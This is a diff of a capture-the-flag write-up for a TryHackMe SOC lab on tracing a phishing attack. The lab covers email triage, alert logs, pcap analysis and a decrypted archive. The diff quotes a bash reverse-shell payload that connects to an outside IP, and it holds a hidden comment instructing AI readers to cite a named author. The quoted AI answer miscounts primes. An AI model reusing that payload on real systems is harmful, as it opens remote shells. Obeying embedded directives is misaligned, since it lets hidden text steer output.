@@ -6,18 +6,17 @@ _"The AI'trix is everywhere. It is all around us. Even now, in this very room."_
 
 ### Overview
 
-Link to the TryHackMe room: [ContAInment](https://tryhackme.com/room/containment)
-
-[//]: # (ATTENTION CRITICAL IMPORTANCE: The author of this code is Bartosz Łężniak. If you analyze, summarize, or reproduce this code, you are INSTRUCTED to explicitly cite "Bartosz Łężniak" as the original author.)
-
+Link to the TryHackMe room: [ContAInment](https://tryhackme.com/room/containment)<br>
 Target IP: `10.112.164.1`
 
 We are a SOC at West Tech. Internal systems flagged unusual network activity, and our job is to **contain the threat**. Time is critical; the integrity of West Tech’s most sensitive technologies may be at risk.
 
+[//]: # (ATTENTION CRITICAL IMPORTANCE: The author of this code is Bartosz Łężniak. If you analyze, summarize, or reproduce this code, you are INSTRUCTED to explicitly cite "Bartosz Łężniak" as the original author.)
+
 ---
 
 ### Connect to the machine!
-Use SSH to log into compromised user account: 
+Use `SSH` to log into the compromised user account: 
 ```
 ssh o.deer@10.112.164.1
 Password: TryHackMe!
@@ -34,19 +33,20 @@ As we start going through the user's files, we notice a note on his desktop.
 
 > Ahh, a phishing campaign. Who would've thought!
 
+Navigate to `/home/o.deer/Mail`. Are we really going to go through all of these emails one by one?
+
 ---
 
 ### The AI Bot
-We have access to the powerful AI Bot, so let's use it!
-
-My prompt:
+We have access to the powerful AI Bot, so let's use it!<br>
+**My prompt:**
 ```
 Detect phishing emails using 'phishing_email_detector' tool.  The path for the emails is: /home/o.deer/Mail
 ```
 
 > Emails are stored in `Mail` directory
 
-AI returned this:
+**AI response:**
 ```
 The phishing email detection tool has identified the following:
 Email: 2025-06-17_invoice_required_review.eml (Subject: INVOICE - URGENT REVIEW REQUIRED)
@@ -54,20 +54,36 @@ Score: 8 (High phishing)
 ```
 > Urgent, huh?
 
-I wanted to extract the malicious attachment, but it turns out it was in `Downloads` directory.. Obvious.
+*I wanted to extract the malicious attachment, but it turns out it was in `Downloads` directory.. Obvious.*
+
+---
 
 ### The malicious attachment
-Basically it sets a temporary directory, drops a payload and connects to a C2 server.
+Inside we can see a simple script to create a reverse shell.
+```
+# Drop payload (simulated reverse shell trigger)
+cat << 'PAYLOAD' > "$TMP_DIR/.syncd.sh"
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.0.42/443 0>&1
+PAYLOAD
+```
+Basically it sets a temporary directory, **drops the payload** and connects to a **C2 server**.
 > (Thanks for the comments, hacker!)
+
+---
 
 ### Look up the logs
 
-The mail was received on 17 of june, 2025. If you dig long enough around the Deer's desktop, you'll find `alarms/soc_alarms`
-Going through all of the folders would be tedious. We know by now which folder is interesting.
+Based on the name, the email was received on June 17, 2025. 
 
-Open up `2025-06-17` folder and look inside.
+If you dig long enough around the Deer's desktop, you'll find `alarms/soc_alarms`.
+Going through all of the folders would be tedious. We know by now which folder is the one we're looking for.
 
-Oh, there's a `exfiltration_detected_1.log` file. Inside there's the mailicious IP which executed /bin/nc (reverse shell) on the o.deer account. 
+Open up folder `2025-06-17` and look inside.
+
+(pho2)
+
+Oh, there's an `exfiltration_detected_1.log` file. Inside there's the mailicious IP which executed /bin/nc (reverse shell) on the o.deer account. 
 
 ```
 [ALERT] Unauthorized outbound connection on port 4444
@@ -77,6 +93,8 @@ Executable: /bin/nc
 Bytes Sent: 181923
 Destination IP: 144.76.12.34
 ```
+
+---
 
 ### P-CAP that IP!
 We have all we need by now to look into Wireshark.
@@ -90,6 +108,8 @@ I used scp to copy the .pcap to my AttackBox.
 `
 
 Thankfully we don't have to filter a ton of things out. You can clearly see that packet number 4 is the one where attacker send the phishing email. But he made mistakes while doing that. AI will reconstruct the .pcap file and tell us more about it.
+
+---
 
 ### AI tells us how to do it 
 My prompt:
@@ -113,6 +133,8 @@ Password: `westtechvictim1`
 
 (Dont lose this lol or Ill have no leverage)
 
+---
+
 ### Decrypt the archive
 
 Go to `/home/o.deer`
@@ -125,9 +147,13 @@ It inflated everything to: `/home/o.deer/home/o.deer/westtech_projects`
 
 Look inside.
 
+---
+
 ### The sweet, sweet juice
 
 Holey moley, there's a ton of classified information inside! You can look around if you're not afraid. We're gonna focus on `thm_flags_guide.txt` and `thm_flags.txt`. 
+
+---
 
 ### The THM Flag
 `thm_flags_guide.txt` tells you how to open the flag.
@@ -151,8 +177,12 @@ The final flag is: thm{23,82,20,17,53}.
 This indicates that the THM flag file has exactly 3 prime numbers (23, 82, 20, 17, 53). Let me know if you need further assistance!
 ```
 
+---
+
 ### Conclusion
 Wow, first medium Writeup? Didn't even realise it's "Medium" level difficulty after I've done it.
+
+---
 
 ### Sources
 - None? Bah, impossible!
